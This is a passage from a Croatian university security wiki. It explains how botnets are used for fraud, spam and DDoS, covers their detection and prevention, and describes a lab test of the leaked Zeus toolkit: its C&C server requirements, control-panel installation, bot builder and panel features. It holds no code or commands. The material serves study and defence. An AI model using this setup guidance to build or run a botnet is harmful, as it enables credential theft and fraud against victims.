</p><p>Radi se o tome da napadači koriste botnete kako bi sakupili velike količine osobnih informacija. Krađom tih podataka mogu se izgraditi lažni identiteti koji potom mogu biti korišteni za pristup osobnim računima. Dakle, kako je glavna namjera korištenja botneta dobivanje financijskih podataka, koriste se za automatsku ekstrakciju korisničkih podataka i vjerodajnica od inficiranih hostova. Pritom, ciljni podaci za krađu uključuju krađu lozinki različitih servisa poput e-maila, web-shopova, bankovnih računa itd. što omogućuje botmasteru predstavljanje žrtve radi provođenja željenih akcija kao što je prijevara. Primjerice, krađom vjerodajnica za web shop ili bankovni račun, napadač može veoma lako profitirati jer ima pristup financijama žrtve. Tako može obavljati kupnju određenih roba ili određene novčane transakcije što predstavlja veliku štetu žrtvi. Ako pak napadač pribavi lozinku e-mail-a, može doći i do kontakata žrtve te oni mogu biti iskorišteni za slanje e-mail-ova koji sadrže maliciozne priloge, za spam i sl..
</p><p><i>Slanje neželjene elektroničke pošte (engl. Spam e-mail)</i>
</p><p>Jedna od najpopularnijih koristi botneta je masovno slanje neželjene elektroničke pošte, što se pod engleskim nazivom naziva spamming. Radi se o tome da današnji spameri posluju sa ili iznajmljuju botnete i tako umjesto da šalju neželjenu elektroničku poštu iz samo jednog izvora, šalju ju sa velikog broja zombija odnosno inficiranih računala u botnetu. Na taj način spamer ostaje anoniman te se sva krivnja prebacuje na inficirano računalo što ujedno komplicira protumjere kao što je stavljanje sumnjivih IP adresa na crnu listu. Gubitak jednog zombija iz botneta ne utječe posebno na slanje spamova te tako botneti predstavljaju idealan medij za spamere koji imaju za primarnu namjenu masovnog slanja elektroničke pošte reklamiranje. Naime, treća strana kupuje ili iznajmljuje usluge od strane botmastera, tj. dostavu hrpe neželjene elekroničke pošte, a ako bi reklamirali svoje proizvode. Ta nepoželjna elektronička pošta tj. spam mail može sadržavati malware u prilogu ili neke poveznice na maliciozne web stranice. Osim toga, tu se pojavljuje pojam „phising“, koji se odnosi na krađu lozinki, a predstavlja još jednu od koristi nepoželjne elektroničke pošte. To se ujedno povezuje sa socijalnim inženjeringom odnosno njegovim manipulativnim radnjama kojima se nastoji nagovoriti žrtvu da ustupi svoje podatke, što daje temelj za krađu identiteta i slično. Smatra se da je u prosjeku 84% nepoželjne elektroničke pošte poslano od strane botneta (prema <a href="http://docs.karamatli.com/paper/karamatli-modern_botnets.pdf" class="external text" rel="nofollow">Ertug Karamatli</a>, 2011., str. 2). 
</p><p><i>Prevara klikom (engl. Click fraud) i plaćanje po instalaciji (engl. Pay-per-install – PPI)</i>
</p><p>Prevara klikom, temelji se na jednom danas veoma popularnom mehanizmu mjerenja popularnosti stranice, a to je mjerenjem broja posjeta ili klikova na web stranici. Osim toga, neke reklame koje se pojavljuju na web stranicama se naplaćuju na temelju modela plaćanja po kliku gdje oglašivač plaća na bazi broja klikova na stranici koje su izvršili posjetitelji na reklami koja se pojavljuje na web stranici. Pritom, svaki mehanizam koji omogućava automatsko povećanje brojača klikova se smatra prevarom. U kontekstu botneta, prilikom prevare klikom, upravitelj botnet mreže tj. botmaster, pokušava na umjetan način podići popularnost određene web stranice tako da naredi velikom broju računala da posjete tu stranicu, prividno stvarajući veliki interes za njenim sadržajem (prema <a href="http://www.cis.hr/files/dokumenti/CIS-DOC-2011-09-026.pdf" class="external text" rel="nofollow">CIS-u</a>, 2011., str. 6). Scenarij je slijedeći: prvo napadač sklapa suradnju s online oglašivačem koji plaća po posjeti stranice ili po kliku na reklamu, a zatim kako ima potpunu kontrolu nad žrtvinim računalom, može koristiti takva računala za simulaciju pregledavanja stranica, te tako može od reklamne kompanije zaraditi puno više novca. Time reklamna kompanija ustvari s obzirom na generirani promet nije zaradila nikakvu dobit jer je velik dio prometa generiran uz pomoć botneta.
</p><p>Osim prethodno spomenutog modela plaćanja po kliku, postoji model plaćanja po instalaciji. Tu se radi o tome da botmaster nudi instalaciju softvera na ciljana računala za svoje klijente. Neki primjeri tog softvera su softver za reklamu (engl adware), koji primjerice pokazuje dodatne reklame u preglednikovim iskočnim prozorima, spyware koji prati ponašanje korisnika ili pak tipovi malwarea koji integriraju žrtvino računalo u drugi botnet. (prema <a href="http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence" class="external text" rel="nofollow">ENISA</a>, 2011., str. 23).
</p><p><i>Distribuirani napad uskraćivanjem usluga (engl. Distributed  Denial  of  Service – DDoS)</i>
</p><p>Kao što i sam naziv kaže, ovdje se radi o napadu kojime se uskraćuju usluge. Naime, svaki server ima određenu granicu propusnosti, tj. određeni kapacitet koji se odnosi na to koliko najviše radnji može napraviti u određenoj jedinici vremena. Ukoliko se ta granica pređe, može doći do rušenja servera čime on postaje nedostupan ili veoma spor za korištenje (prema <a href="http://www.cis.hr/files/dokumenti/CIS-DOC-2011-09-026.pdf" class="external text" rel="nofollow">CIS-u</a>, 2011., str. 6). Kako je većini firmi veoma važna dostupnost njihovih stranica s informacijama, uslugama i sl. na Internetu za uspješnost poslovanja, bitno je da ne dođe do nedostupnosti svega što nude. Dakle, očito je da je ispravno funkcioniranje servera koji drži web stranice poduzeća veoma bitno za poduzeća koja posluju i online. Kod distribuiranog napada uskraćivanjem usluga, radi se o tome da botmaster naredi svim računalima nad kojima ima nadzor, tj. onim koji čine botnet da pristupe određenoj Internet stranici u isto vrijeme  te time ugroze rad poslužitelja na kojem se nalazi web stranica. Napad se zove distribuiranim iz razloga što u napadu sudjeluje velik broj geografski distribuiranih inficiranih računala. Takvi napadi se događaju prilično često, a profitna shema vezana uz korištenje botneta u te svrhe je ucjena odnosno iznuda novca od napadnute tvrtke. Osim toga, mogući razlog takvih napada je nanošenje štete konkurenciji i zadobivanja tržišne prednosti.
</p><p><i>Hosting ilegalnih materijala i širenje malicioznog koda</i>
</p><p>Ilegalni materijal podrazumijeva slike, video-zapise i sl. dječje pornografije, piratski softver ili kod za krekiranje licenciranog softvera, piratske e-knjige, igrice i tako dalje, a koje mogu biti pohranjene kao dinamički repozitorij na ugroženo računalo od strane botmastera (prema <a href="http://sprouts.aisnet.org/594/1/Botnet_Sprotus.pdf" class="external text" rel="nofollow">Sprouts</a>, 2009., str. 8). Osim toga, taj ilegalni materijal često zna sadržavati maliciozni kod u obliku različitih malwarea. Kako svi botovi sadrže funkcionalnost koja dopušta FTP, HTTP i TFTP skidanje datoteka i izvršenje izvršnih datoteka, botneti to koriste za ažuriranje svojih malicioznih kodova, a osim toga, na temelju naredbe botmastera može biti skinuta bilo koja datoteka koju je odredio botmaster za skidanje. Upravo mogućnost botova da skidaju i instaliraju izvršne datoteke, koristi se za instaliranje dodatnih malwarea.
</p><p><i>Njuškanje prometa i praćenje korištenja tipkovnice (engl. Sniffing Traffic and Keylogging)</i>
</p><p>Kada govorimo o njuškanju prometa u kontekstu botova, misli se na to da botovi mogu koristiti paket njuškala za praćenje zanimljivih, jasnih tekstualnih prolaza ugroženog računala (prema <a href="http://www.honeynet.org/node/52" class="external text" rel="nofollow">The Honeynet Project</a>). Praćenje odnosno promatranje prometa može dovesti do detekcije velikog iznosa informacija kao što su navike korisnika, ili pak informacije poput lozinki i korisničkih imena za što se njuškala najčešće i koriste. Osim toga, ukoliko je neko računalo ugroženo više puta te je tako dio više različitih botneta, može sakupljati informacije i od drugih botneta.
</p><p>Što se tiče praćenja korištenja tipkovnice, ono uskače kada je njuškanje nemoguće zbog šifriranih komunikacijskih kanala te tako čini još jednu od značajki botova. Naime, uz pomoć praćenja korištenja tipkovnice veoma se lako može doći do osjetljivih informacija, a tome pripomaže i korištenje mehanizma filtriranja ključnih nizova blizu ključnih riječi (prema <a href="http://www.honeynet.org/node/52" class="external text" rel="nofollow">The Honeynet Project</a>). 
</p><p><i>Manipulacija online anketama/igrama (engl. Manipulating online polls/games)</i>
</p><p>Kod manipulacije online anketama i igrama, radi se o tome da ankete i igre mogu veoma lako postati žrtvama botneta gdje botovi mogu manipulirati rezultatima. Kako svaki bot ima različitu IP adresu, svaki glas od strane bota u nekoj anketi će imati istu vrijednost kao i glas dan od strane stvarne osobe, a slično je i kod igrica.
</p><p><i>Politički interesi</i>
</p><p>Već smo više puta rekli kako je glavni motiv napadača ekonomska korist, no osim toga, ponekad su razlozi korištenja botneta politički ili vojni interesi. Tako je primjerice bio napad botnetom GhostNet koji je inficirao 1295 računala u 103 zemlje, pri čemu je oko 30% inficiranih računala bilo visoke vrijednosti jer su bili u vladinim ustanovama. Ta računala su uključivala računala iz različitih veleposlanstava, ministarstava i povjerenstava. Nekoliko mrežnih tragova snimljenih iz tih računala pokazala su komunikaciju između inficiranih hostova i IP adresa od C&amp;C servera smještenih u Kini. Zanimljivo je da su ti tragovi pokazali izvlačenje osjetljivih dokumenata. (prema <a href="http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence" class="external text" rel="nofollow">ENISA</a>, 2011., str. 24).
</p><p>Na temelju nabrojanih aktivnosti koje mogu biti djelo botneta i koje mogu iskoristiti napadači za ispunjenje svojih ciljeva, možemo vidjeti da botneti predstavljaju veoma dobar temelj za obavljanje kriminalnih radnji. Iz tog razloga, moramo naučiti što više o svim mogućim prijetnjama, o tome kako se napadači obično ponašaju i sukladno tome razviti tehnike za borbu protiv njih.
</p>
<h3> <span class="mw-headline" id="Prevencija.2C_detekcija_i_prekidanje_botneta">Prevencija, detekcija i prekidanje botneta</span></h3>
<p>Botneti predstavljaju veliki izazov za Internetsku zajednicu jer napadači koriste sve bolje alate. Tako ujedno i borba protiv botneta, ali i detekcija botmastera postaju sve izazovnijima.
</p><p>Prevencija napada odnosno postajanja žrtve botneta zahtijeva visoku razinu svjesnosti o online sigurnosti i privatnosti. Prema tome, moramo održavati sustav kako bi bio najnoviji, instaliranjem raznih ažuriranja i zakrpa operativnog sustava, i kako bismo smanjili na minimum ranjivosti sustava.  Nadalje, također je veoma važno regularno instalirati sigurnosne zakrpe za preglednike, ažurirati softver (držati ga „up-to-date“), zaštititi računalo sigurnosnim alatima i redovito ih ažurirati kako bi se izbjegle moguće infekcije. Tako je primjerice, dobro i uključiti vatrozid i koristiti antivirusne programe kako bismo držali sustav čistim. Korisna stvar je i korištenje Captche testova koji su predloženi za website i druge servise za zaštitu od botova i drugih malicioznih agenata te je dobro i blokiranje protokola koje botneti koriste. I na kraju bitno je još napomenuti da su piratski softver, igrice i drugi ilegalni materijali koji su dostupni online često izvor malicioznog koda te da tako predstavljaju veliku sigurnosnu prijetnju i da se stoga korisnici trebaju ograničiti od pristupa takvim materijalima i stranicama koji ih sadrže.
</p><p>Detekcija botneta predstavlja veliki izazov, a naročito zato što mnogi nisu ni svjesni da su njihova računala dio botneta. Neke od tehnika detekcije baziranih na hostu su antivirusni softveri za detekciju i uklanjanje bota, pri čemu postoje i Antibot softveri za istu svrhu, zatim sustavi hosta za detekciju/prevenciju upada (HIDS/HIPS) koji ograničavaju razne aplikacije koje se mogu izvršavati na sustavu, te tehnike bazirane na OS alatima kao što su netstat, reg, dir, tasklist i druge (prema <a href="http://www.sans.org/reading_room/whitepapers/firewalls/intrusion-detection-response-leveraging-generation-firewall-technology_33053" class="external text" rel="nofollow">SANS Institute InfoSec Reading Room</a>, str. 15). Osim tehnika baziranih na hostu, postoje i tehnike temeljene na mreži. Neke od tih tehnika su NIPS (Network intrusion pervention systems) koji brani sustav od infekcije botom blokirajući poznate mrežne napade koji uzrokuju infekciju malware-om te koji blokira napade od strane inficiranih hostova i dopušta detekciju ugroženih hostova, zatim pregled firewall logova što može biti neprocjenjivo za detekciju malwarea čak i bez opsežnog antivirusa te mrežna revizija puta koja se može učiniti i pomoću Wiresharka. Jedna od tehnika je također i filtriranje malicioznog sadržaja u Web i e-mail prometu koja je inače više obrambena tehnika, ali ima i važnu ulogu u detekciji, a postoje i DNS bazirane tehnike koje se također mogu koristiti u obrani i detekciji botova. Kao još jednu zanimljivu metodu detekcije spomenut ćemo honeypot. Honeypot je popularna metoda za stavljanje zamke i detekciju aktivnosti botneta. Općenito, honeypot je izoliran i zaštićen sustav koji se pojavljuje kao dio mreže i ima na njoj pohranjene važne informacije. On dopušta da bude inficiran od strane bota te da postane dio botneta, nakon čega se koristi za snimanje bot malwarea i detekciju bot kontrolera (prema <a href="http://sprouts.aisnet.org/594/1/Botnet_Sprotus.pdf" class="external text" rel="nofollow">Sprotus</a>, 2009., str. 9). Također, metrike kao što su veze, odgovori i sinkronizacija su predlagane za detekciju botneta kroz analizu njihova ponašanja.
</p><p>Nakon detekcije botneta, važno je neutraliziranje zombi računala tako da se sa njega makne bot infekcija, a najvažnije je i ometanje ili čak onemogućavanje rada C&amp;C servera cijelog botneta nakon što je pronađen. Jedan od pristupa za čišćenje mreže od inficiranih računala, tj. botova je pristup pod engleskim nazivom wallen garden. Wallen garden se odnosi na tehnike koje može poduzeti pružatelj mrežnih usluga (engl. network provider) kako bi motivirao pretplatnike na čišćenje svojih inficiranih računala. To se još zna zvati online okolinom u kojoj inficirani hostovi mogu poduzeti mjere za uklanjanje neželjenog softvera (prema <a href="http://www.internet-sicherheit.de/fileadmin/docs/publikationen/dietrich/Christian-Rossow-Christian-J.-Dietrich-Literature-survey-and-Report.pdf" class="external text" rel="nofollow">Institut für Internet-Sicherheit</a>, 2009., str. 20). Tako korisnici sa instaliranim malwareom mogu vidjeti website upozorenje od strane mrežnog opearatora umjesto od website-a na koji su željeli ući. Osim toga, na tom website-u, pružatelj mrežnih usluga može ponuditi sigurnosne zakrpe ili neku drugu vrstu podrške kako bi korisnici uklonili malware sa svojeg računala. Međutim, iako ovaj pristup zvuči veoma dobro, vjerojatno nikad se njime neće moći ukloniti cijeli botnet jer vjerojatno svi pružatelji mrežnih usluga neće htjeti poduzeti napore za taj pristup.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Anita.laktasic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Anita.laktasic (stranica ne postoji)">Anita Laktašić</a> 20:05, 28. prosinca 2011. (CET)
</p>
<h2> <span class="mw-headline" id="Zeus">Zeus</span></h2>
<h3> <span class="mw-headline" id="Predstavljanje_Zeusa">Predstavljanje Zeusa</span></h3>
<p>Kao što ste mogli do sada shvatit malware predstavlja vrlo veliki problem u svijetu računalne tehnologije. Kada govorimo o botnetima kao obliku malware-a tada postoji nekolicina primjera koji se u svijetu računalnog kriminala smatraju kraljevima. Tako je Zeus prvi puta primjeren 2007 godine te se smatra da je postojao neko vrijeme prije toga. S vremenom mogao se pratiti njegov napredak i rast a uglavnom se bazirao na organizaciji s ruskog govornog područja. Tijekom zadnje dvije godine mogli smo svjedočiti njegovom konstantnom napretku i rastu te hvaljenju od strane underground foruma. Zeusova reputacija stečena je kroz vrlo velik bro zaraženih računala te velik broj ukradenih podataka s zaraženih računala. Ovisno o izvedbi bot-a i nedostatcima koje iskorištava Zeus može vršiti razne oblike krađe podataka, tako možemo reći da se radi o bankarskom trojanu, html injector-u, kradljivcu formi ili key logger-u. U ovakvom okruženju korisnik računala gotovo e u cijelosti pod nadzorom vlasnika bot-a. Na taj način napadač može kontrolirati i modificirati web okruženje u kojem se korisnik nalazi te u svakom trenutku tražiti korisnika neki oblik njegovih podataka. Cijeli postupak oko krađe i spremanja podataka se obavlja vrlo uredno kroz funkcionalnosti bot-a koje omogućuju prikupljanje relevantnih podataka koji se mogu spremati u SQL bazu podataka. Takav način prikupljanja podataka napadaču omogućuje jednostavno i brzo sortiranje i pronalaženje njemu potrebnih podataka kako bi ih iskoristio u svrhu krađe. Zeus-ova struktura podjeljena je na dva osnovna dijela&#160;: 
</p>
<ul><li>	Bot klijent- koji zarazi računalo žrtve i izvršava sav maliciozni kod koji mu je naređen te podatke koje prikupi šalje napadaču.
</li><li>	Komandna i kontrolna struktura (C&amp;C) koja osigurava upute za iskorištavanje nekog propusta ili upute za umetanje koda u html te kao centar u koji se šalju svi podatci koji su prikupljeni od strane bot-ova.
</li></ul>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_20_botnet.png" class="image"><img alt="S 20 botnet.png" src="../../images/6/6a/S_20_botnet.png" width="351" height="214" /></a>
</p><p>Ovakva struktura je jednostavna za praćenje i vizualizaciju ali ponešto zastarjela pošto se infrastruktura novijih botnet-a sastoji od razina komunikacije te velikog broja servera koji služe kao posrednici za komunikaciju, sve to trebalo bi onemogućiti praćenje i pronalaženje centralnog komandnog centra. U slučaju sa Zeus-om komunikaciju je moguće prekinuti pronalaženjem centralnog servera koji se može naći posjedovanjem zaraženog računala i praćenjem aktivnosti koje to računalo ima s internetom. U slučaju otkrivanja komandnog centra bot-ovi koji su pripadaju tom centru mogu nastaviti komunikaciju s nekim drugim serverom ali u takvim slučajevima potrebno je predodrediti takve podatke u konfiguraciji bot-a. Cijeli sustav tako leži na principu posjedovanje servera koji nije podložan zahtjevima za gašenje te se takvi serveri lako mogu naći na prodaji po underground forumima kao "bulletproof hosting".
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_19_botnet.png" class="image"><img alt="S 19 botnet.png" src="../../images/b/b0/S_19_botnet.png" width="543" height="309" /></a>
</p><p>Kako je primjer najbolji način za shvaćanje i proučavanje ovakvih oblika prijetnji odlučili smo se baciti u potragu za izvornim kodom i postojećim botovima koji su poznati na internetu. Sve prikazane napravljeno je u edukacijske svrhe te prilikom izrade nije zaraženo nijedno računalo izvan testnog okruženja.
</p>
<h3> <span class="mw-headline" id="Zeus_toolkit">Zeus toolkit</span></h3>
<p>Zeus je opće poznat kao Zbot koji zarazi računalo i s njega pokušava uspostaviti komunikaciju s komandnim centrom, ono što je manje poznato je da on dolazi s potpunim toolkitom koji sadrži sve potrebno za izradu distribuciju i kontrolu jednom napravljenog bot-a. S jednog mjesta napadač može kontrolirati cijeli botnet bez prevelikih problema. Ovakav način kontroliranja i upravljanja bot-ovima je u najmanju ruku zastrašujuće jer se vidi kompleksnost i količina resusra potrebana za izradu tako funkcionalnog i jednostavnog alata. Ono što je jednako toliko impresivno je način na koji se ovakav toolkit prodaje i distribura u podzemnom miljeu, tako se nedavno ovakav toolkit prodavao za nevjerojatnih 5000 dolara s uključenim bullet proof hostingom i korisničkom podrškom, dakle ovdje se ne radi o jednostavnom sklepanom komadu softvera već o profesionalno napravljenom i upakiranom sustavu. Ako ste nešto boljeg socijalnog statusa i nemate vremena ni volje se baviti sporim poslom širenja svog bot-a jednostavno potražite cijeli botnet koji će vam individualci drage volje prodati za neki iznos. Na taj način dobit ćete već postavljenu infrastrukturu koja je spremna za kreiranje spam poruka ili krađu podataka. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_18_botnet.png" class="image"><img alt="S 18 botnet.png" src="../../images/1/1f/S_18_botnet.png" width="217" height="430" /></a>
</p><p>Krenimo s samim toolkitom, navedeni je bio vrlo dobro ćuvan te se prodavao kao osnova za svakoga tko je htio na jednostavan način napraviti i kontrolirati svoj botnet. Oko 10.05.2011 počelo se pričati o izlasku cjelokupnog izvornog koda ovog toolkita, to je značilo da je negdje bilo moguće skinuti kod za jedan od najpopularnijih malware-a koji su ikad postojali i to besplatno. Tako se ovaj toolkit bez velikog problema može naći kao zeus.rar na velikom broju mjesta te sadrži cjelokupni build Zeus generatora i komandnog centra. Iz priložene strukture vidljivo je da se radi o projektu koji se bez problema može otvoriti u VS2010 te se od tamo mogu pregledati cjelokupni izvorni kod ez puno muke. VS nam pak otkriva da je cjeli toolkit rađena kao skup od 7 projekata sklopljenih kako bi tvorili Zeus toolkit. Ono što je interesantno za one iskusnije programere je naravno sam builder projekt. Builder projekt sadrži funkcionalnost generatora bot-a te je ujedno i glavno mjesto za unapređivanje ovog malware-a. Cijeli builder je napisan u C++ te komentiran s ruskim jezikom tako da je potrebno dosta vremena kako bi mogli krenuti s proučavanjem. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_17_botnet.png" class="image"><img alt="S 17 botnet.png" src="../../images/f/f9/S_17_botnet.png" width="239" height="205" /></a>
</p><p>Kako je nam je prije svega bila potrebna vizualizacija cijele ove zbrke koja međusobno poziva interne i eksterne biblioteke željeli smo napraviti klas diagram unutar samog VS-a no pošto cijel stvar ima tek nekoliko klasa to i nije bilo od neke velike pomoći. Arhitecture explorer je pomogao do te mjere da smo mogli vidjeti koliko stvari idu u dubinu te koje su osnovne povezanosti unutar projekta. Ono što je uistinu interesantno je kako to sve izgleda kroz dependencies graf dobije se slika svih biblioteka i međusobno povezanih dijelova koda, odsječak tog grafa izgleda otprilike kao na slici 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_16_botnet.png" class="image"><img alt="S 16 botnet.png" src="../../images/0/05/S_16_botnet.png" width="476" height="376" /></a>
</p><p>Cijeli prikaz moguće je vidjeti na stranici&#160;: <a href="http://crazylazy.info/~wishi/pics/ArchInternalDependencies-DirectoryStructure-Zeus.png" class="external free" rel="nofollow">http://crazylazy.info/~wishi/pics/ArchInternalDependencies-DirectoryStructure-Zeus.png</a>
Na priloženoj slici možemo vidjeti samo odsječak onoga što se zbilja nalazi unutar toolkita. Komandni centar koji je uključen u toolkit je PHP baziran te se praktički sva funkcionalnost sa strane napadača bazira na PHP-u. Ono što se zahtjeva od napadača kao kontrolnog centra je infrastruktura servera koja prema priloženom priručniku mora sadržavati&#160;:
</p>
<ul><li>	2GB RAM
</li><li>	2CPU's at 2GHz
</li><li>	SATA hard drives at 7200+ rpm
</li><li>	HTTP server (Apache, IIS)
</li><li>	PHP 5.2.6 +
</li><li>	MySql
</li><li>	Zend optimizer 3.3 +
</li></ul>
<p>Također postoje i osnovni zahtjevi za podešenjima php.ini datoteke kako bi se moglo ostvariti korektno komuniciranje s clijentima. Za samu bazu podataka bitno je da ima velik broj mogućih konekcija kako bi bot-ovi mogli pristupiti bazi i vršiti upis podataka, preporućeno 2000 + mogućih konekcija. U uputama su jasno naznačene naredbe koje se mogu slati bot-ovima i poboljšanja koja su napravljana s novijim verzijama. Tako možemo vidjeti da verzija 2.0.0.0 nosi čak 25 unaprjeđenja.
Za potrebe testiranja i pregleda mogućnosti našeg toolkita kreirali smo virtualni stroj u kojem će se nalaziti C&amp;C botnet-a i stroj koji će primiti bot-a i biti zaražen njima, u ova dva virtualna stroja provest ćemo praćenje i analizu rezultata provedenog testiranja. 
</p>
<h4> <span class="mw-headline" id="Postavljanje_okoline">Postavljanje okoline</span></h4>
<p>Za poćetak kreiramo virtualni stroj koji će sadržavati C&amp;C, pošto naši resursi ne zadovoljavaju potrebe koje su navedene za upravljanje bootnetom prisiljeni smo raditi s manjim resursima no to ne bi trebao predstavljati problem s obzirom na jednog bot-a. Kako bi smo smjestili komandni centar potreban nam je web server, za te potrebe poslužiti će Wamp server. Unutar instaliranog wamp servera stavili smo cijeli zeus-ov toolkit koko bi smo mogli pokrenuti instalaciju.
Za potrebe klijentskog računala naravili smo još jedan virtualni stroj na koji smo instalirali nekoliko alata za praćenje i analizu. ProcessExplorer će nam poslužiti za pregled stanja procesa, wireshark za pregled komunikacije između servera i bot-a te slika registrija kako bi se kasnije mogle utvrditi promjene koje je napravio bot. Pošto je kontrolnom panelu potrebna baza unutar MySql napravit ćemo praznu bazu podataka koja će u prilikom instalacije biti popunjena odgovarajućim tablicama. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_16_botnet.png" class="image"><img alt="S 16 botnet.png" src="../../images/0/05/S_16_botnet.png" width="476" height="376" /></a>
</p><p>Nakon kreiranja baze podataka potrebno je instalirati kontrolni panel, kako toolkit sadrži direktorij s instalacijom potrebno je browser uputiti na taj direktorij i u dobivenu formu unijeti podatke. Od bitnih stvari tu su naziv naše baze podataka te lozinka koje je zapisana u config.txt datoteci te se koristi kako priliko kreiranja bot-a prema toj lozinci vrš se prepoznavanje i dekriptiranje podataka dobivenih od bot-a.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_15_botnet.png" class="image"><img alt="S 15 botnet.png" src="../../images/5/55/S_15_botnet.png" width="234" height="284" /></a>
</p><p>Nakon instalacije možemo vidjeti da se naša baza podataka popunila novim tablicama te se također unio i jedan korisnik kojem je omogućen ulaz u kontrolni panel.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_14_botnet.png" class="image"><img alt="S 14 botnet.png" src="../../images/2/26/S_14_botnet.png" width="230" height="148" /></a><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_13_botnet.png" class="image"><img alt="S 13 botnet.png" src="../../images/a/a7/S_13_botnet.png" width="492" height="146" /></a>
</p><p>Nakon cijelog postupka potrebno je pokrenuti cp.php unutar direktorija namijenjenog serveru te se time pokreće kontrolni panel koji najprije zahtjeva login podatke korisnika.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_12_botnet.png" class="image"><img alt="S 12 botnet.png" src="../../images/2/2c/S_12_botnet.png" width="383" height="127" /></a>
</p><p>Problemi na koje smo naišli vežu se uz login u sustav, naime nismo bili u mogućnosti prijaviti se na temelju podataka koje smo unijeli prilikom instalacije. Iako sustav nije obavještavao o pogrešnom unosu korisničkog imena ili lozinke nije nas puštao na glavnu stranicu kontrolnog panela. Nakon pozamašnog proučavanja ruskog i prevođenja komentara unutar PHP koda u kojem je napisan čitav kontrolni panel i pokušavanja upada u sustav moramo naglasiti da očito fale neki dijelovi koda koji onemogućavaju ulazak u sustav. Ovo i nije toliko teško za povjerovati pošto se ipak radi o vrijednom komadu softvera koji je vjerojatno prošao kroz neke preinake prije nego što je uspio doći na Internet.
</p><p> 
</p>
<h4> <span class="mw-headline" id="Builder">Builder</span></h4>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_11_botnet.png" class="image"><img alt="S 11 botnet.png" src="../../images/5/5e/S_11_botnet.png" width="392" height="264" /></a>
</p><p>Glavno sučelje samog programa koji generira bot je vrlo jednostavno za korištenje, štoviše radi se o nekoliko klikova mišem kojim se na jednostavan način dolazi do bot-a. Vidimo da se ovdje radi o verziji 2.0.8.9 koja je nedavno bila puštena u javnost. Početni tab koristi se za otklanjanje samog bot-a ali do toga ćemo doći nešto kasnije. Dolje je prikazan sam builder i u njemu se nalazi nekoliko tipaka od toga imamo traženje config datoteke koja se koristi kao referentna točka bot-u i u nju se spremaju podatci o tome kako i što bot treba raditi na zaraženom računalu. Jednom definiran config kriptira se i pakira u binarnu datoteku koju kasnije bot pokušava dohvatiti. Generiranje samog bot-a je jedan pritisak gumba te se na taj način dobiva generički bot kojem je moguće dati neko ime. Sam bot se od drugih razlikuje po djelu koji je konfiguriran u config datoteci i tiče se statičkog djela konfiguracije. Statički dio automatski postaje dio bot-a i on se ne mijenja dok se dinamički dio mijenja s obzirom na upute koje dobiva od strane kontrolnog centra.
Dio s opcijama ima samo jednu opciju a to je izbor jezika na kojem želimo da builder radi.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_10_botnet.png" class="image"><img alt="S 10 botnet.png" src="../../images/0/09/S_10_botnet.png" width="392" height="263" /></a><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_9_botnet.png" class="image"><img alt="S 9 botnet.png" src="../../images/d/da/S_9_botnet.png" width="393" height="311" /></a>
</p><p>Jednom kreirani bot bez problema može zaraziti naše računalo tj. računalo na kojem je bio kreiran, pošto to nije svrha samog bot-a u alat je uključena opcija kojom je bez problema moguće pronaći i otkloniti kreirani bot. Na temelju lozinke za enkripciju koja je postavljena u config-u bot-a isti se traži na računalu, i u slučaju da je zarazio komandno računalo, otklanja
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_8_botnet.png" class="image"><img alt="S 8 botnet.png" src="../../images/1/1a/S_8_botnet.png" width="393" height="265" /></a>
</p>
<h4> <span class="mw-headline" id="Control_Panel">Control Panel</span></h4>
<p>Jedom kad se kontrolni panel napokon otvori pozdravlja vas poćetna stranica s osnovnim podatcima o tome koliko je računala zaraženo vašim bot-om i koliko je istih aktivno, također moguće je pregledavati bot-ove prema botnet-ima koje se mogu kreirati kako bi se računala žrtvi mogla grupirati za lakše upravljanje i nadziranje.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_7_botnet.png" class="image"><img alt="S 7 botnet.png" src="../../images/0/0c/S_7_botnet.png" width="431" height="255" /></a>
</p><p>Sustav između ostalog omogućava izlistavanje bot-ova ovisno o operativnom sustavu na kojem se nalaze ali i o velikom broju drugih parametara koji se mogu definirati u tablici filter-a. Filteri tako mogu osigurati precizno sortiranje bot-ova ovisno o njihovom statusu, imenu itd. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_6_botnet.png" class="image"><img alt="S 6 botnet.png" src="../../images/2/2d/S_6_botnet.png" width="459" height="122" /></a>
</p><p>Rezultati pretrage dobivaju se u tablici sa svim relevantnim podatcima o računalu koje je trenutno zaraženo i o kojoj se vrsti bot-a radi.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_5_botnet.png" class="image"><img alt="S 5 botnet.png" src="../../images/e/e1/S_5_botnet.png" width="445" height="78" /></a>
</p><p>Za odabrani bot predstavlja se niz opcija koje su vezane uz funkcionalnost, izvještavanje i slanje novih zadataka. Ovako organiziran upravljački centar je odlično dizajniran i za neke legalne komade softvera. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_4_botnet.png" class="image"><img alt="S 4 botnet.png" src="../../images/3/34/S_4_botnet.png" width="230" height="150" /></a>
